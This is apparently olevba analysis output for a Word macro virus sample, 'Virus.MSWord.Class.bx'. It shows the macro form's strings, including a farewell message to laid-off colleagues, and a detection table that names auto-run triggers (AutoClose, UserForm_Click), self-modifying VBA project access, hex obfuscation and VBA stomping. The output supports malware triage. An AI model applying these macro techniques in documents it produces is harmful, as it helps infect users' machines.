VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-eH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This message was dedicated 2 all my friends, who have good skill but terminated from their company, and become joblessomI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missede
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Keep your good working guys, We appreciated with all you have done, good luck and success 4 Uds,I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

